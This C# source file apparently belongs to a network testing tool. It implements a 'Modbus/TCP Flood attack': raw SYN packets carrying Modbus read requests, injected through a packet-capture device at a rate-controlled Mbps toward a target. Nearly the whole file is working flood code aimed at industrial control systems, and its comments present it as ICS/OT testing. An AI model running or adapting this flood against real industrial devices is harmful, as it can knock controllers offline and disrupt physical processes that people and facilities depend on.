using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    /// <summary>
    /// TCP flood attack with Modbus/TCP payloads.
    /// Generates syntactically valid Modbus/TCP read requests for ICS/OT testing.
    /// Uses the same rate limiting logic as TcpFlood for accurate Mbps control.
    /// </summary>
    public class ModbusTcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        private readonly Random _random = new Random();
        public event EventHandler<PacketEventArgs>? PacketSent;

        /// <summary>
        /// Unit ID for Modbus/TCP requests (default: 1)
        /// </summary>
        public byte UnitId { get; set; } = 1;

        /// <summary>
        /// Function code for Modbus requests (default: 0x03 = Read Holding Registers, non-destructive)
        /// </summary>
        public byte FunctionCode { get; set; } = 0x03;

        /// <summary>
        /// Starting address for read requests (default: 0)
        /// </summary>
        public ushort StartAddress { get; set; } = 0;

        /// <summary>
        /// Quantity of registers to read (default: 1)
        /// </summary>
        public ushort Quantity { get; set; } = 1;

        public ModbusTcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        /// <summary>
        /// Builds a Modbus/TCP ADU (Application Data Unit) payload.
        /// Structure: Transaction ID (2) + Protocol ID (2) + Length (2) + Unit ID (1) + PDU (variable)
        /// </summary>
        private byte[] BuildModbusTcpPayload()
        {
            // Modbus/TCP ADU structure:
            // - Transaction ID: 2 bytes (increment or random)
            // - Protocol ID: 2 bytes (always 0x0000 for Modbus/TCP)
            // - Length: 2 bytes (PDU length in bytes)
            // - Unit ID: 1 byte (slave/device identifier)
            // - PDU (Protocol Data Unit): Function code + data
            
            // Build PDU: Function Code + Start Address (2 bytes) + Quantity (2 bytes)
            byte[] pdu = new byte[5];
            pdu[0] = FunctionCode; // Function code (0x03 = Read Holding Registers)
            
            // Start address (big-endian)
            byte[] addressBytes = BitConverter.GetBytes(StartAddress);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(addressBytes);
            pdu[1] = addressBytes[0];
            pdu[2] = addressBytes[1];
            
            // Quantity (big-endian)
            byte[] quantityBytes = BitConverter.GetBytes(Quantity);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(quantityBytes);
            pdu[3] = quantityBytes[0];
            pdu[4] = quantityBytes[1];
            
            // Build ADU
            byte[] adu = new byte[7 + pdu.Length]; // 6 bytes header + 1 byte unit ID + PDU
            ushort transactionId = (ushort)_random.Next(1, 65536);
            ushort protocolId = 0x0000; // Always 0 for Modbus/TCP
            ushort length = (ushort)(1 + pdu.Length); // Unit ID (1) + PDU length
            
            // Transaction ID (big-endian)
            byte[] transIdBytes = BitConverter.GetBytes(transactionId);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(transIdBytes);
            adu[0] = transIdBytes[0];
            adu[1] = transIdBytes[1];
            
            // Protocol ID (big-endian)
            byte[] protoIdBytes = BitConverter.GetBytes(protocolId);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(protoIdBytes);
            adu[2] = protoIdBytes[0];
            adu[3] = protoIdBytes[1];
            
            // Length (big-endian)
            byte[] lengthBytes = BitConverter.GetBytes(length);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(lengthBytes);
            adu[4] = lengthBytes[0];
            adu[5] = lengthBytes[1];
            
            // Unit ID
            adu[6] = UnitId;
            
            // PDU
            Array.Copy(pdu, 0, adu, 7, pdu.Length);
            
            return adu;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting Modbus/TCP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                IInjectionDevice? injectionDevice = _device as IInjectionDevice;
                bool useInjection = injectionDevice != null;
                
                if (!useInjection)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                // Build Modbus/TCP payload
                byte[] modbusPayload = BuildModbusTcpPayload();
                
                Logger.Info($"Modbus/TCP payload size: {modbusPayload.Length} bytes, Function Code: 0x{FunctionCode:X2}, Unit ID: {UnitId}");

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                // Create TCP packet with SYN flag and Modbus payload
                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,  // SYN flag
                    WindowSize = 8192,
                    SequenceNumber = 0
                };

                // Add Modbus/TCP payload
                tcpPacket.PayloadData = modbusPayload;

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                // Get actual packet size
                int actualPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 1000;

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];
                    var packetPool = new byte[batchSize][];

                    // Pre-generate packet pool
                    for (int i = 0; i < batchSize; i++)
                    {
                        // Regenerate Modbus payload with new transaction ID for each packet
                        byte[] newModbusPayload = BuildModbusTcpPayload();
                        tcpPacket.PayloadData = newModbusPayload;
                        
                        // Randomize sequence number for variation
                        _random.NextBytes(bytes);
                        tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                        
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        packetPool[i] = ethernetPacket.Bytes;
                    }

                    // Use actual packet size for rate calculation (Ethernet frame includes all headers + FCS)
                    int wirePacketSize = actualPacketSize + 4; // Add FCS
                    long targetBytesPerSecond = _params.BytesPerSecond;
                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;
                    
                    Logger.Info($"Modbus/TCP packet wire size: {wirePacketSize} bytes, Target rate: {targetMbps:F2} Mbps");
                    
                    // Byte-budget rate control: track bytes sent vs time elapsed
                    long bytesSent = 0;
                    var currentBatch = 0;
                    
                    // Rate measurement for logging/UI only (not used for timing)
                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500; // Measure every 500ms
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3; // Exponential smoothing factor
                    
                    // Determine if low rate (for Windows-friendly waiting)
                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0; // For mixing sleep with spin-wait at low rates

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Calculate how many bytes we're "allowed" to have sent so far
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);
                            
                            // If we're behind budget, send packets (small burst)
                            if (bytesSent < allowedBytes)
                            {
                                // Calculate how many packets we can send to catch up
                                // Dynamically adjust burst size based on target rate for better throughput
                                long bytesBehind = allowedBytes - bytesSent;
                                int maxBurst = targetMbps > 50 ? 50 : (targetMbps > 10 ? 20 : 10); // Higher burst for higher rates
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, maxBurst);
                                
                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    var packet = packetPool[currentBatch];
                                    injectionDevice!.SendPacket(packet);
                                    OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                    
                                    bytesSent += wirePacketSize;
                                    currentBatch++;
                                    
                                    // Regenerate packet pool when needed
                                    if (currentBatch >= batchSize)
                                    {
                                        // Regenerate in smaller chunks to reduce blocking
                                        int regenerateCount = Math.Min(100, batchSize);
                                        for (int j = 0; j < regenerateCount; j++)
                                        {
                                            // Regenerate Modbus payload with new transaction ID
                                            byte[] newModbusPayload = BuildModbusTcpPayload();
                                            tcpPacket.PayloadData = newModbusPayload;
                                            
                                            // Randomize sequence number
                                            _random.NextBytes(bytes);
                                            tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                                            
                                            tcpPacket.UpdateCalculatedValues();
                                            ipPacket.UpdateCalculatedValues();
                                            packetPool[j] = ethernetPacket.Bytes;
                                        }
                                        currentBatch = 0;
                                    }
                                }
                            }
                            else
                            {
                                // We're at or above budget - wait briefly
                                // Windows-friendly waiting: spin-wait at high rates, mix sleep+spin at low rates
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                {
                                    // At low rates, sleep occasionally to avoid pegging CPU core
                                    Thread.Sleep(0); // Yield to other threads
                                }
                                else
                                {
                                    // Short spin-wait for precision
                                    Thread.SpinWait(10);
                                }
                            }

                            // Rate measurement for logging/UI (time-based window, smoothed)
                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;
                            
                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);
                                
                                // Exponential smoothing to reduce Windows jitter
                                if (smoothedActualMbps == 0)
                                    smoothedActualMbps = actualMbps;
                                else
                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);
                                
                                Logger.Info($"Modbus/TCP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");
                                
                                // Reset measurement window
                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending Modbus/TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Modbus/TCP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}

